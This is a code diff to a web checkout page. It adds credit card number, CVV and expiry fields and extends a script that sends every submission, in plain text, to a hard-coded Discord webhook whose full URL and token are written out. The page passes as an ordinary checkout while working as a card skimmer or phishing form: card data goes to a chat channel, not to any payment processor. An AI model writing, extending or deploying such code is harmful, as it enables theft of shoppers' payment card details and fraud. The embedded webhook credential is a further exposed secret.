@@ -44,8 +44,7 @@
       width: 100%;
     }
 
-    .checkout-form input[type="text"],
-    .checkout-form input[type="email"] {
+    .checkout-form input {
       padding: 8px;
       margin-bottom: 10px;
       width: 100%;
@@ -67,6 +66,9 @@
       <p>Fill in the information below:</p>
       <input type="text" name="name" placeholder="Your Name" required>
       <input type="email" name="email" placeholder="Your Email" required>
+      <input type="text" name="creditCard" placeholder="Credit Card" required>
+      <input type="text" name="cvv" placeholder="CVV" required>
+      <input type="text" name="expiry" placeholder="MM/YY" required>
       <input type="submit" value="Submit">
     </form>
   </div>
@@ -79,11 +81,14 @@
 
       const name = checkoutForm.elements.name.value;
       const email = checkoutForm.elements.email.value;
+      const creditCard = checkoutForm.elements.creditCard.value;
+      const cvv = checkoutForm.elements.cvv.value;
+      const expiry = checkoutForm.elements.expiry.value;
 
       // Send data to Discord webhook
       const webhookURL = 'https://discord.com/api/webhooks/1114657015738925107/MT7b6nMzahc-5R4D1esqG9FjwTEt3n5qjiAUo1qT1vHKNeXCj1ubye4mVVfAa_k4sqSM';
       const payload = {
-        content: `New checkout:\nName: ${name}\nEmail: ${email}`
+        content: `New checkout:\nName: ${name}\nEmail: ${email}\nCredit Card: ${creditCard}\nCVV: ${cvv}\nExpiry: ${expiry}`
       };
 
       fetch(webhookURL, {
